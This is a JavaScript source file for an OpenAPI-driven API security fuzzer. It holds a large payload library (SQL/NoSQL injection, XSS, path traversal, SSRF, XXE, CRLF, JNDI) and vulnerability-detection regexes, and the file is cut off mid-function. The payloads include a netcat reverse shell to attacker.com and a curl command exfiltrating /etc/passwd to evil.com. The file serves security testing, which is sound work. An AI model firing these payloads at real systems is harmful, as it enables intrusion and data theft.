// addons/fuzz/fuzz.js
import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { faker } from '@faker-js/faker';
import yaml from 'js-yaml';
import { randomUUID } from 'crypto';
import StructureMutator from './modules/structureMutator.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ==================== НАСТРОЙКИ ЛОГИРОВАНИЯ ====================
const FUZZ_LOG_DIR = './logs/fuzz';
const SESSION_ID = randomUUID();
const LOG_FILE = path.join(FUZZ_LOG_DIR, `log.txt`);

if (!fs.existsSync(FUZZ_LOG_DIR)) {
  fs.mkdirSync(FUZZ_LOG_DIR, { recursive: true });
}

function writeLog(level, message, data = null) {
  const timestamp = new Date().toISOString();
  let logEntry = `[${timestamp}] [${level.toUpperCase()}] ${message}`;
  
  if (data !== null) {
    if (typeof data === 'object') {
      try {
        logEntry += `\n${JSON.stringify(data, null, 2)}`;
      } catch (e) {
        logEntry += `\n${String(data)}`;
      }
    } else {
      logEntry += `\n${String(data)}`;
    }
  }
  
  logEntry += '\n' + '='.repeat(80) + '\n';
  
  try {
    fs.appendFileSync(LOG_FILE, logEntry, 'utf8');
  } catch (err) {
    // Silent error
  }
}

writeLog('info', 'ЗАПУСК SUPER FUZZER');
writeLog('info', 'SESSION ID: ' + SESSION_ID);
writeLog('info', 'Лог файл: ' + LOG_FILE);

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
const safeStringify = (obj, maxLength = 200) => {
  if (!obj) return '';
  if (typeof obj === 'string') return obj.substring(0, maxLength);
  if (typeof obj === 'number') return String(obj);
  if (typeof obj === 'boolean') return String(obj);
  if (typeof obj === 'object') {
    try {
      const str = JSON.stringify(obj);
      return str.substring(0, maxLength);
    } catch (e) {
      return String(obj).substring(0, maxLength);
    }
  }
  return String(obj).substring(0, maxLength);
};

const safeSubstring = (str, start, end) => {
  if (!str || typeof str !== 'string') return '';
  return str.substring(start, end || start + 100);
};

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
  REQUEST_TIMEOUT: 5000,
  MAX_RETRIES: 2,
  RETRY_DELAY: 1000,
  MAX_RESPONSE_SIZE: 10 * 1024 * 1024,
  CONCURRENCY: 10,
  MUTATION_DEPTH: 5,
  EXTREME_MUTATION_COUNT: 2
};

// ==================== PAYLOADS БАЗА ДАННЫХ (ПОЛНАЯ) ====================
const PAYLOADS = {
  sql: {
    error_based: [
      "'", "''", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1",
      "1' AND '1'='2", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
      "'; DROP TABLE users--", "' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'",
      "1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE SLEEP(5))--"
    ],
    boolean_based: [
      "' AND '1'='1", "' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
      "' OR '1'='1'--", "' OR '1'='2'--"
    ],
    time_based: [
      "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ]
  },
  xss: {
    reflected: [
      "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
      "'><script>alert(1)</script>", "</script><script>alert(1)</script>",
      "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>"
    ],
    dom_based: [
      "\"><img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
      "{{constructor.constructor('alert(1)')()}}", "${alert(1)}"
    ],
    blind: [
      "<script src='https://collaborator.com/xss.js'></script>",
      "<img src='https://collaborator.com/xss.png'>"
    ]
  },
  command: {
    linux: [
      "; ls", "| cat /etc/passwd", "|| whoami", "& id", "&& uname -a",
      "$(pwd)", "`pwd`", "; nc -e /bin/sh attacker.com 4444",
      "| curl http://evil.com/steal?data=`cat /etc/passwd`"
    ],
    windows: [
      "; dir", "| type C:\\Windows\\win.ini", "& whoami", "&& ipconfig",
      "| powershell -c \"Get-ChildItem\""
    ],
    bypass: [
      "cAt /Etc/PaSsWd", "c\"a\"t /etc/passwd", "ca$()t /etc/passwd",
      "${IFS}cat${IFS}/etc/passwd"
    ]
  },
  path: {
    linux: [
      "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
      "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd"
    ],
    windows: [
      "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
      "..\\..\\..\\boot.ini", "....\\....\\....\\windows\\win.ini"
    ]
  },
  ssrf: {
    cloud_metadata: [
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://100.100.100.200/latest/meta-data/"
    ],
    internal: [
      "http://localhost:80", "http://localhost:8080", "http://127.0.0.1:22",
      "http://127.0.0.1:3306", "http://internal-admin.local/"
    ],
    file: [
      "file:///etc/passwd", "file:///c:/windows/win.ini",
      "gopher://localhost:8080", "dict://localhost:11211"
    ]
  },
  nosql: {
    operators: [
      '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$or": []}',
      '{"$where": "1==1"}', '{"$ne": ""}', '{"$exists": true}'
    ],
    string: [
      "admin' && this.password.match(/.*/)//",
      "username[$ne]=null&password[$ne]=null"
    ]
  },
  header: {
    crlf: [
      "test\r\nX-Injected: true", "test\nX-Injected: true",
      "%0d%0aX-Injected:%20true", "test%0d%0aSet-Cookie:%20injected=1"
    ],
    host: ["evil.com", "localhost:8080", "127.0.0.1", "169.254.169.254"],
    xss: ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd"]
  },
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
  ],
  graphql: [
    '{__typename}',
    '{users{password}}',
    'query {__typename}',
    'query {users{id username password}}',
    'mutation {__typename}',
    '{__schema{types{name fields{name}}}}'
  ],
  soap: [
    '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><id>1</id></GetUser></soap:Body></soap:Envelope>',
    '<?xml version="1.0"?><soap:Envelope><soap:Body><Union>SELECT * FROM users</Union></soap:Body></soap:Envelope>',
    '<soap:Envelope><soap:Body><Login><username>admin\' OR \'1\'=\'1</username><password>anything</password></Login></soap:Body></soap:Envelope>'
  ],
  large: {
    strings: [
      'A'.repeat(10000), 'B'.repeat(20000), '%00'.repeat(5000),
      '🔥'.repeat(3000), 'A'.repeat(10000) + '../'.repeat(1000)
    ],
    numbers: ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity']
  },
  // ============================================================
  // ДОБАВЛЯЕМ IDOR / BOLA ПЕЙЛОАДЫ
  // ============================================================
  idor: {
    numeric: [
      '1', '2', '3', '4', '5', '10', '100', '999', '1000',
      '0001', '00001', '000001',
      '9999999999', '99999999999',
      '-1', '0', '1e9', '1e10',
      'null', 'undefined', 'NaN', 'Infinity'
    ],
    string: [
      'admin', 'root', 'test', 'user', 'guest', 'administrator',
      'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
      '00000000-0000-0000-0000-000000000000',
      'ffffffff-ffff-ffff-ffff-ffffffffffff'
    ],
    email: [
      'admin@example.com', 'user@example.com', 'test@example.com',
      'root@localhost', 'admin@admin.com'
    ],
    username: [
      'admin', 'root', 'test', 'user', 'guest',
      'administrator', 'superuser', 'system'
    ],
    path: [
      '../admin', '../root', '../../etc/passwd',
      '%2e%2e%2fadmin', '%2e%2e%2froot'
    ],
    sql: [
      "' OR 1=1--", "' OR '1'='1",
      "1' OR '1'='1", "1' OR 1=1--"
    ]
  }
};

// ==================== ДЕТЕКТОР УЯЗВИМОСТЕЙ (ПОЛНЫЙ) ====================
class VulnerabilityDetector {
  constructor() {
    this.patterns = this.initPatterns();
    this.foundVulnerabilities = new Set();
  }

  initPatterns() {
    return {
      // ... все существующие паттерны ...
      sql: [
        { pattern: /SQL syntax.*MySQL/i, severity: 'critical', type: 'MySQL SQL Injection' },
        { pattern: /You have an error in your SQL syntax/i, severity: 'critical', type: 'SQL Injection' },
        { pattern: /ORA-\d{5}/i, severity: 'critical', type: 'Oracle SQL Injection' },
        { pattern: /PostgreSQL.*ERROR/i, severity: 'critical', type: 'PostgreSQL SQL Injection' },
        { pattern: /SQLite.*syntax error/i, severity: 'critical', type: 'SQLite SQL Injection' },
        { pattern: /unclosed quotation mark/i, severity: 'critical', type: 'MSSQL Injection' },
        { pattern: /Microsoft.*ODBC/i, severity: 'critical', type: 'ODBC SQL Injection' },
        { pattern: /Division by zero in SQL/i, severity: 'high', type: 'SQL Error Based' },
        { pattern: /Column.*not found/i, severity: 'medium', type: 'SQL Column Discovery' },
        { pattern: /Table.*doesn't exist/i, severity: 'medium', type: 'SQL Table Discovery' },
        { pattern: /Unknown column/i, severity: 'medium', type: 'SQL Column Discovery' },
        { pattern: /Duplicate entry/i, severity: 'low', type: 'SQL Information Leak' },
        { pattern: /Data too long for column/i, severity: 'low', type: 'SQL Truncation' },
        { pattern: /warning.*mysql/i, severity: 'low', type: 'SQL Warning Disclosure' }
      ],
      xss: [
        { pattern: /<script[^>]*>.*?<\/script>/i, severity: 'high', type: 'Reflected XSS' },
        { pattern: /alert\([^)]*\)/i, severity: 'high', type: 'XSS - Alert' },
        { pattern: /confirm\([^)]*\)/i, severity: 'high', type: 'XSS - Confirm' },
        { pattern: /prompt\([^)]*\)/i, severity: 'high', type: 'XSS - Prompt' },
        { pattern: /onerror\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
        { pattern: /onload\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
        { pattern: /onclick\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
        { pattern: /onmouseover\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
        { pattern: /javascript:/i, severity: 'high', type: 'XSS - Protocol' },
        { pattern: /<img[^>]+onerror=/i, severity: 'high', type: 'XSS - Image Error' },
        { pattern: /<svg[^>]+onload=/i, severity: 'high', type: 'XSS - SVG Vector' },
        { pattern: /<body[^>]+onload=/i, severity: 'high', type: 'XSS - Body Load' },
        { pattern: /<input[^>]+onfocus=/i, severity: 'high', type: 'XSS - Input Focus' },
        { pattern: /<iframe[^>]+src=/i, severity: 'high', type: 'XSS - Iframe' },
        { pattern: /<object[^>]+data=/i, severity: 'high', type: 'XSS - Object' },
        { pattern: /<embed[^>]+src=/i, severity: 'high', type: 'XSS - Embed' },
        { pattern: /<link[^>]+href=/i, severity: 'medium', type: 'XSS - Link' }
      ],
      command: [
        { pattern: /uid=\d+\([^)]+\)/i, severity: 'critical', type: 'Command Injection - User Info' },
        { pattern: /gid=\d+\([^)]+\)/i, severity: 'critical', type: 'Command Injection - Group Info' },
        { pattern: /root:[^:]*:[^:]*:/i, severity: 'critical', type: 'Command Injection - Password File' },
        { pattern: /Directory of/i, severity: 'high', type: 'Command Injection - Directory Listing' },
        { pattern: /Volume Serial Number/i, severity: 'medium', type: 'Command Injection - Volume Info' },
        { pattern: /Total Files:/i, severity: 'medium', type: 'Command Injection - File Count' },
        { pattern: /[A-Z]:\\/i, severity: 'high', type: 'Command Injection - Windows Path' },
        { pattern: /\/home\/[a-z]+/i, severity: 'high', type: 'Command Injection - Linux Path' },
        { pattern: /\/etc\/passwd/i, severity: 'critical', type: 'Command Injection - Passwd Access' },
        { pattern: /C:\\Windows\\System32/i, severity: 'high', type: 'Command Injection - System32 Access' },
        { pattern: /whoami/i, severity: 'high', type: 'Command Injection - User Discovery' },
        { pattern: /hostname/i, severity: 'medium', type: 'Command Injection - Hostname Discovery' }
      ],
      path: [
        { pattern: /root:[^:]*:[^:]*:/i, severity: 'high', type: 'Path Traversal - Passwd' },
        { pattern: /\[extensions\]/i, severity: 'medium', type: 'Path Traversal - Win.ini' },
        { pattern: /boot\.ini/i, severity: 'high', type: 'Path Traversal - Boot Config' },
        { pattern: /\[fonts\]/i, severity: 'medium', type: 'Path Traversal - Fonts' },
        { pattern: /\[mail\]/i, severity: 'medium', type: 'Path Traversal - Mail Config' },
        { pattern: /\[MCI\]/i, severity: 'low', type: 'Path Traversal - MCI Config' },
        { pattern: /\/etc\/shadow/i, severity: 'critical', type: 'Path Traversal - Shadow File' },
        { pattern: /\/etc\/hosts/i, severity: 'medium', type: 'Path Traversal - Hosts File' },
        { pattern: /\/var\/log/i, severity: 'medium', type: 'Path Traversal - Log Files' }
      ],
      ssrf: [
        { pattern: /\"instanceId\"/i, severity: 'critical', type: 'SSRF - AWS Metadata' },
        { pattern: /\"hostname\".*\"project-id\"/i, severity: 'critical', type: 'SSRF - GCP Metadata' },
        { pattern: /\"availability_zone\"/i, severity: 'high', type: 'SSRF - Cloud Metadata' },
        { pattern: /\"secret-key\"/i, severity: 'critical', type: 'SSRF - Secret Key Leak' },
        { pattern: /169\.254\.169\.254/i, severity: 'critical', type: 'SSRF - AWS Metadata Access' },
        { pattern: /metadata\.google\.internal/i, severity: 'critical', type: 'SSRF - GCP Metadata Access' },
        { pattern: /localhost/i, severity: 'medium', type: 'SSRF - Localhost Access' },
        { pattern: /127\.0\.0\.1/i, severity: 'medium', type: 'SSRF - Loopback Access' }
      ],
      nosql: [
        { pattern: /\$ne/i, severity: 'high', type: 'NoSQL - $ne Operator' },
        { pattern: /\$gt/i, severity: 'high', type: 'NoSQL - $gt Operator' },
        { pattern: /\$regex/i, severity: 'high', type: 'NoSQL - $regex Operator' },
        { pattern: /\$or/i, severity: 'high', type: 'NoSQL - $or Operator' },
        { pattern: /\$where/i, severity: 'critical', type: 'NoSQL - $where Injection' }
      ],
      info_leak: [
        { pattern: /api[_-]?key["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'critical', type: 'API Key Disclosure' },
        { pattern: /secret["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'critical', type: 'Secret Disclosure' },
        { pattern: /password["\s:=]+[^"\s]{4,}/i, severity: 'high', type: 'Password Disclosure' },
        { pattern: /token["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'high', type: 'Token Disclosure' },
        { pattern: /aws[_-]?access[_-]?key/i, severity: 'critical', type: 'AWS Key Disclosure' },
        { pattern: /private[_-]?key/i, severity: 'critical', type: 'Private Key Disclosure' },
        { pattern: /jwt["\s:=]+eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+\/=]*/i, severity: 'high', type: 'JWT Token Disclosure' },
        { pattern: /mongodb:\/\/[^"\s]+/i, severity: 'critical', type: 'MongoDB Connection String' },
        { pattern: /mysql:\/\/[^"\s]+/i, severity: 'critical', type: 'MySQL Connection String' },
        { pattern: /postgresql:\/\/[^"\s]+/i, severity: 'critical', type: 'PostgreSQL Connection String' },
        { pattern: /redis:\/\/[^"\s]+/i, severity: 'critical', type: 'Redis Connection String' }
      ],
      debug: [
        { pattern: /stack trace/i, severity: 'medium', type: 'Stack Trace Disclosure' },
        { pattern: /exception in/i, severity: 'medium', type: 'Exception Disclosure' },
        { pattern: /debug mode/i, severity: 'low', type: 'Debug Mode Enabled' },
        { pattern: /FLASK_ENV.*development/i, severity: 'low', type: 'Development Mode' },
        { pattern: /DJANGO_DEBUG.*True/i, severity: 'low', type: 'Django Debug Mode' },
        { pattern: /NODE_ENV.*development/i, severity: 'low', type: 'Node Dev Mode' },
        { pattern: /RACK_ENV.*development/i, severity: 'low', type: 'Rack Dev Mode' },
        { pattern: /RAILS_ENV.*development/i, severity: 'low', type: 'Rails Dev Mode' }
      ],
      xxe: [
        { pattern: /file:\/\/\/etc\/passwd/i, severity: 'critical', type: 'XXE Injection - File Read' },
        { pattern: /root:[^:]*:[^:]*:/i, severity: 'critical', type: 'XXE Injection - Passwd Content' },
        { pattern: /DOCTYPE.*SYSTEM/i, severity: 'high', type: 'XXE Injection' }
      ],
      graphql: [
        { pattern: /__typename/i, severity: 'medium', type: 'GraphQL Introspection' },
        { pattern: /__schema/i, severity: 'medium', type: 'GraphQL Schema Leak' },
        { pattern: /\"data\":\s*\{/i, severity: 'low', type: 'GraphQL Response' }
      ],
      soap: [
        { pattern: /soap:Envelope/i, severity: 'low', type: 'SOAP Response' },
        { pattern: /faultcode/i, severity: 'medium', type: 'SOAP Fault' }
      ],
      // ============================================================
      // ДОБАВЛЯЕМ IDOR / BOLA ДЕТЕКЦИЮ
      // ============================================================
      idor: [
        { pattern: /"user_id":\s*\d+/i, severity: 'high', type: 'IDOR - User ID Disclosure' },
        { pattern: /"userId":\s*\d+/i, severity: 'high', type: 'IDOR - User ID Disclosure' },
        { pattern: /"id":\s*\d+/i, severity: 'medium', type: 'IDOR - ID Disclosure' },
        { pattern: /"email":\s*"[^"]+@[^"]+"/i, severity: 'medium', type: 'BOLA - Email Disclosure' },
        { pattern: /"username":\s*"[^"]+"/i, severity: 'medium', type: 'BOLA - Username Disclosure' },
        { pattern: /"role":\s*"admin"/i, severity: 'critical', type: 'BOLA - Admin Role Disclosure' },
        { pattern: /"isAdmin":\s*true/i, severity: 'critical', type: 'BOLA - Admin Flag Disclosure' },
        { pattern: /"user":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - User Data Access' },
        { pattern: /"profile":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - Profile Data Access' },
        { pattern: /"account":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - Account Data Access' },
        { pattern: /"post":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Post Access' },
        { pattern: /"order":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Order Access' },
        { pattern: /"document":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Document Access' },
        { pattern: /"users":\s*\[[^\]]*"id":\s*\d+[^\]]*\]/i, severity: 'medium', type: 'BOLA - User List Leak' },
        { pattern: /"items":\s*\[[^\]]*"id":\s*\d+[^\]]*\]/i, severity: 'medium', type: 'BOLA - Item List Leak' }
      ]
    };
  }

  // ... detect и resetDetections без изменений ...
  detect(response, testCase) {
    const vulnerabilities = [];
    const responseText = typeof response?.data === 'string' ? response.data : JSON.stringify(response?.data || '');
    const status = response?.status || 0;
    const headers = response?.headers || {};
    
    const endpointKey = `${testCase.path}_${testCase.method}`;
    
    // CORS
    if (headers['access-control-allow-origin'] === '*' && !this.foundVulnerabilities.has(`cors_${endpointKey}`)) {
      this.foundVulnerabilities.add(`cors_${endpointKey}`);
      vulnerabilities.push({
        type: 'CORS Misconfiguration - Wildcard Origin',
        severity: 'medium',
        endpoint: testCase.path,
        method: testCase.method,
        response_status: status,
        snippet: 'Access-Control-Allow-Origin: * allows any domain'
      });
    }
    
    // Детекция уязвимостей в заголовках
    if (testCase.type === 'header_mutation' && testCase.headers) {
      if (responseText.includes('X-Injected') || 
          responseText.includes('Set-Cookie') ||
          headers['User-Agent']?.includes('\r\n') && responseText.includes('X-Injected')) {
        const key = `header_crlf_${endpointKey}`;
        if (!this.foundVulnerabilities.has(key)) {
          this.foundVulnerabilities.add(key);
          vulnerabilities.push({
            type: 'CRLF Injection - Header Injection Successful',
            severity: 'high',
            category: 'header',
            endpoint: testCase.path,
            method: testCase.method,
            payload: safeStringify(testCase.payload, 200),
            response_status: status,
            snippet: 'CRLF injection payload reflected in response'
          });
        }
      }
      
      for (const [key, value] of Object.entries(testCase.headers)) {
        if (typeof value === 'string' && value.length > 10000) {
          const largeKey = `header_large_${endpointKey}`;
          if (!this.foundVulnerabilities.has(largeKey)) {
            this.foundVulnerabilities.add(largeKey);
            vulnerabilities.push({
              type: 'Large Header - Possible DoS',
              severity: 'medium',
              category: 'header',
              endpoint: testCase.path,
              method: testCase.method,
              payload: `Header ${key} size: ${value.length}`,
              response_status: status,
              snippet: `Server accepted header of size ${value.length}`
            });
          }
          break;
        }
      }
      
      for (const [key, value] of Object.entries(testCase.headers)) {
        if (value === null || value === undefined || typeof value === 'object') {
          const typeKey = `header_type_${endpointKey}`;
          if (!this.foundVulnerabilities.has(typeKey)) {
            this.foundVulnerabilities.add(typeKey);
            vulnerabilities.push({
              type: 'Unexpected Header Type - Null/Undefined/Object',
              severity: 'medium',
              category: 'header',
              endpoint: testCase.path,
              method: testCase.method,
              payload: `Header ${key} has type ${typeof value}`,
              response_status: status,
              snippet: `Server accepted ${typeof value} as header value`
            });
          }
          break;
        }
      }
      
      if (status === 500) {
        const crashKey = `header_crash_${endpointKey}`;
        if (!this.foundVulnerabilities.has(crashKey)) {
          this.foundVulnerabilities.add(crashKey);
          vulnerabilities.push({
            type: 'Header Injection - Server Crash',
            severity: 'high',
            category: 'header',
            endpoint: testCase.path,
            method: testCase.method,
            payload: safeStringify(testCase.payload, 200),
            response_status: status,
            snippet: 'Server crashed on malicious headers'
          });
        }
      }
    }
    
    // Проверка всех категорий
    for (const [category, patterns] of Object.entries(this.patterns)) {
      for (const pattern of patterns) {
        if (pattern.pattern.test(responseText)) {
          const key = `${category}_${endpointKey}_${pattern.type}`;
          if (!this.foundVulnerabilities.has(key)) {
            this.foundVulnerabilities.add(key);
            vulnerabilities.push({
              type: pattern.type,
              severity: pattern.severity,
              category: category,
              endpoint: testCase.path,
              method: testCase.method,
              payload: safeStringify(testCase.payload, 200),
              response_status: status,
              snippet: safeSubstring(responseText, 0, 300)
            });
          }
          break;
        }
      }
    }
    
    return vulnerabilities;
  }

  resetDetections() {
    this.foundVulnerabilities.clear();
  }
}

// ==================== ОСНОВНОЙ КЛАСС ФАЗЗЕРА ====================
class APIFuzzer {
  constructor(swaggerFile, options = {}) {
    this.swaggerFile = swaggerFile;
    this.baseUrl = options.baseUrl || '';
    this.timeout = options.timeout || CONFIG.REQUEST_TIMEOUT;
    this.concurrency = options.concurrency || CONFIG.CONCURRENCY;
    this.spec = null;
    this.testCases = [];
    this.results = [];
    this.detector = new VulnerabilityDetector();
    this.mutator = new StructureMutator();
    this.startTime = null;
    this.stats = { total: 0, completed: 0, vulnerabilities: 0 };
  }

  extractPathParams(pathUrl) {
    const matches = pathUrl.match(/\{([^}]+)\}/g);
    if (!matches) return [];
    return matches.map(m => m.slice(1, -1));
  }

  interpolateUrl(url, pathParams) {
    let result = url;
    for (const [key, value] of Object.entries(pathParams || {})) {
      result = result.replace(`{${key}}`, encodeURIComponent(String(value)));
    }
    return result;
  }

  async loadSpec() {
    writeLog('info', 'Загрузка Swagger спецификации...');
    const content = fs.readFileSync(this.swaggerFile, 'utf8');
    const ext = path.extname(this.swaggerFile).toLowerCase();
    
    this.spec = (ext === '.yaml' || ext === '.yml') ? yaml.load(content) : JSON.parse(content);
    
    if (!this.spec.openapi && !this.spec.swagger) {
      throw new Error('Невалидная OpenAPI/Swagger спецификация');
    }
    
    writeLog('info', `Загружена: ${this.spec.info?.title || 'Unknown'} v${this.spec.info?.version || '?'}`);
    return this.spec;
  }

  generateNormalPayload(operation) {
    const result = { query: {}, path: {}, body: null };
    
    const pathParams = this.extractPathParams(operation.path);
    for (const paramName of pathParams) {
      result.path[paramName] = faker.number.int({ min: 1, max: 100 });
    }
    
    const parameters = operation.parameters || [];
    for (const param of parameters) {
      if (param.in === 'query') {
        result.query[param.name] = this.generatePayload(param.schema) ?? faker.string.alphanumeric(8);
      }
    }
    
    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
      const schema = operation.requestBody?.content?.['application/json']?.schema;
      if (schema) {
        result.body = this.generatePayload(schema);
      } else {
        result.body = { test: 'data', id: faker.number.int({ min: 1, max: 100 }) };
      }
    }
    
    return result;
  }

  generatePayload(schema) {
    if (!schema) return 'test';
    if (schema.$ref) return this.generatePayload(this.resolveRef(schema.$ref));
    if (schema.enum) return faker.helpers.arrayElement(schema.enum);

    switch (schema.type) {
      case 'string':
        if (schema.format === 'email') return faker.internet.email();
        if (schema.format === 'uuid') return faker.string.uuid();
        return faker.string.alphanumeric(8);
      case 'integer':
        return faker.number.int({ min: schema.minimum || 1, max: schema.maximum || 1000 });
      case 'boolean':
        return faker.datatype.boolean();
      case 'object':
        if (schema.properties) {
          const obj = {};
          for (const [k, v] of Object.entries(schema.properties)) {
            obj[k] = this.generatePayload(v);
          }
          return obj;
        }
        return {};
      case 'array':
        const count = faker.number.int({ min: 1, max: 3 });
        return Array(count).fill().map(() => this.generatePayload(schema.items));
      default:
        return 'test';
    }
  }

  resolveRef(ref) {
    if (!ref || !ref.startsWith('#/')) return null;
    let current = this.spec;
    const parts = ref.replace('#/', '').split('/');
    for (const part of parts) {
      current = current?.[part];
    }
    return current;
  }

  getHeaders(operation) {
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': 'Hercules Fuzz/2.0'
    };
    
    const security = operation.security || this.spec.security || [];
    for (const scheme of security) {
      if (scheme.bearerAuth) {
        headers['Authorization'] = 'Bearer test-token-12345';
      }
    }
    
    return headers;
  }

  normalizeUrl(url) {
    if (!url) return '';
    return url.replace(/([^:]\/)\/+/g, "$1");
  }

  buildInjectionPayload(operation, injectionValue) {
    const result = { query: {}, path: {}, body: null };
    
    const pathParams = this.extractPathParams(operation.path);
    for (const paramName of pathParams) {
      result.path[paramName] = injectionValue;
    }
    
    const parameters = operation.parameters || [];
    for (const param of parameters) {
      if (param.in === 'query') {
        result.query[param.name] = injectionValue;
      }
    }
    
    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
      result.body = { input: injectionValue, command: injectionValue };
    }
    
    return result;
  }

  generateHeaderMutationVariants(baseHeaders) {
    const variants = [];
    
    const maliciousValues = {
      injection: [
        "' OR 1=1--", "<script>alert(1)</script>", "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}", "test\r\nX-Injected: malicious",
        "test%0d%0aX-Injected:%20malicious", "'; DROP TABLE users; --",
        "`id`", "$(whoami)", "| cat /etc/passwd"
      ],
      large: ['A'.repeat(5000), 'B'.repeat(10000), 'X'.repeat(20000), '🔥'.repeat(3000)],
      extreme: [null, undefined, 123456789, true, false, {}, [], '', '💥⚡🔥💀']
    };
    
    const headersToMutate = [
      'User-Agent', 'Referer', 'Origin', 'Accept', 'Accept-Language',
      'Accept-Encoding', 'X-Forwarded-For', 'X-Request-ID', 
      'X-Custom-Header', 'X-API-Key', 'Cookie'
    ];
    
    for (const headerName of headersToMutate) {
      for (const payload of maliciousValues.injection.slice(0, 3)) {
        const mutatedHeaders = { ...baseHeaders };
        mutatedHeaders[headerName] = payload;
        variants.push({ type: `injection_${headerName}`, headers: mutatedHeaders });
      }
    }
    
    for (const headerName of headersToMutate.slice(0, 5)) {
      for (const payload of maliciousValues.large.slice(0, 2)) {
        const mutatedHeaders = { ...baseHeaders };
        mutatedHeaders[headerName] = payload;
        variants.push({ type: `large_${headerName}`, headers: mutatedHeaders });
      }
    }
    
    for (const headerName of headersToMutate.slice(0, 3)) {
      for (const payload of maliciousValues.extreme) {
        const mutatedHeaders = { ...baseHeaders };
        mutatedHeaders[headerName] = payload;
        variants.push({ type: `extreme_${headerName}`, headers: mutatedHeaders });
      }
    }
    
    const crlfPayloads = [
      'test\r\nX-Injected: true', 'test%0d%0aX-Injected:%20true', 'test\r\nSet-Cookie: injected=1'
    ];
    for (const payload of crlfPayloads) {
      const mutatedHeaders = { ...baseHeaders };
      mutatedHeaders['User-Agent'] = payload;
      mutatedHeaders['X-CRLF-Test'] = payload;
      variants.push({ type: 'crlf_injection', headers: mutatedHeaders });
    }
    
    const extraMaliciousHeaders = [
      { 'X-Forwarded-For': '127.0.0.1, evil.com' },
      { 'X-Original-URL': '/admin' },
      { 'X-Rewrite-URL': '/admin' },
      { 'X-HTTP-Method-Override': 'POST' },
      { 'X-Forwarded-Host': 'evil.com' },
      { 'Host': 'evil.com' },
      { 'X-Forwarded-Proto': 'http' }
    ];
    
    for (const extraHeader of extraMaliciousHeaders) {
      const mutatedHeaders = { ...baseHeaders, ...extraHeader };
      variants.push({ type: 'extra_malicious', headers: mutatedHeaders });
    }
    
    return variants.slice(0, 30);
  }

  generateHeaderMutationTests(method, pathUrl, fullUrl, operation, baseHeaders) {
    const tests = [];
    const normalPayload = this.generateNormalPayload(operation);
    const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
    
    const injectionHeaders = this.mutator.mutateHeaders(baseHeaders, 'injection');
    tests.push({
      id: `${method}_${pathUrl}_headers_injection`,
      method, url: finalUrl, path: pathUrl,
      type: 'header_mutation', subType: 'injection',
      queryParams: normalPayload.query, headers: injectionHeaders,
      body: normalPayload.body,
      payload: { type: 'header_injection', mutated: injectionHeaders }
    });
    
    const largeHeaders = this.mutator.mutateHeaders(baseHeaders, 'large');
    tests.push({
      id: `${method}_${pathUrl}_headers_large`,
      method, url: finalUrl, path: pathUrl,
      type: 'header_mutation', subType: 'large',
      queryParams: normalPayload.query, headers: largeHeaders,
      body: normalPayload.body,
      payload: { type: 'header_large', mutated: largeHeaders }
    });
    
    const extremeHeaders = this.mutator.mutateHeaders(baseHeaders, 'extreme');
    tests.push({
      id: `${method}_${pathUrl}_headers_extreme`,
      method, url: finalUrl, path: pathUrl,
